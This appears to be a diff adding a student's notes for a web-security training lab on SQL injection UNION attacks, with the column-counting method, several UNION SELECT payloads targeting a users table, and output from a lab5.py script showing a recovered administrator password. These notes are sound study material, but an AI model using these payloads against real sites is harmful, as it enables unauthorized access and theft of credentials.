@@ -1,0 +1,23 @@
+SQL injection UNION attack, retrieving data from other tables
+
+END GOAL: retrieves all usernames and passwords, 
+END GOAL: use the information to log in as the administrator user.
+
+' UNION SELECT username, password FROM users--
+
+METHOD:
+
+1.  ORDER BY CLAUSE: Get number of columns in user tables
+2.  UNION CALUSE: find if the columns are of string type
+3.  Print all the data and login as administrator
+
+'union+select+username,password+from+users-- 
+'union+select+username,password+from+users+where+username='administrator'--
+
+URL : https://LAB_ID.web-security-academy.net
+
+python lab5.py "https://LAB_ID.web-security-academy.net"
+[+] SQL Injection successful, number of columns: 2
+[+] SQL has two string type columns
+[+] SQL administrator password found
+[+] SQL admin password: spfqgvr4hnspmqv0zq8g
